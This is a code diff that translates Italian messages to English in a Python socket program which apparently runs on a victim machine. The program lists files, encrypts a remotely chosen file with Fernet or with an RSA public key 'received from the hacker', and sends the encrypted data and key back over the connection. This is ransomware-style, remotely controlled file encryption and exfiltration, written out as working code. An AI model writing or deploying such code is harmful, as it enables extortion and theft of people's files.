@@ -24,16 +24,16 @@ while 1:
             lista = os.listdir(".")
             conn.send(str(lista).encode())
 
-        if datastringa == "CIFRA SIMMETRICA":
+        if datastringa == "Symmetric Cryptography":
             nomefile = conn.recv(1024)
             filename = nomefile.decode()
-            print("il nome del file è:", filename)
+            print("The filename is:", filename)
 
             index = lista.index(filename)
-            print("la posizione del file nell'elenco è:", str(index))
+            print("The position of the file is:", str(index))
 
             filedacifrare = lista[index]
-            print("il file da cifrare è:", filedacifrare)
+            print("The file to encript is:", filedacifrare)
 
             key = Fernet.generate_key()
             fernet = Fernet(key)
@@ -50,26 +50,26 @@ while 1:
             conn.send(key)
             conn.send(encMessage)
 
-        if datastringa == "CIFRA ASIMMETRICA":
+        if datastringa == "Asymmetric Cryptography":
             nomefile = conn.recv(1024)
             filename = nomefile.decode()
-            print("il nome del file è:", filename)
+            print("The name of the file is:", filename)
 
             index = lista.index(filename)
-            print("la posizione del file nell'elenco è:", str(index))
+            print("The position of the file is:", str(index))
 
             filedacifrare = lista[index]
-            print("il file da cifrare è:", filedacifrare)
+            print("The file to encript is:", filedacifrare)
 
             f = open(filedacifrare, "rb")
             message = f.read()
             f.close()
 
             public_key = conn.recv(512)
-            print("La chiave pubblica che ricevo dall'hacker è:", public_key.decode())
+            print("The public received from the hacker is:", public_key.decode())
 
             chiave_pubblica = rsa.PublicKey.load_pkcs1(public_key,
                                                        format='PEM')
             encMessage = rsa.encrypt(message, chiave_pubblica)
-            print("Il messaggio cifrato con la chiave pubblica è:", encMessage)
+            print("The encripted message through the public key is:", encMessage)
             conn.send(encMessage)
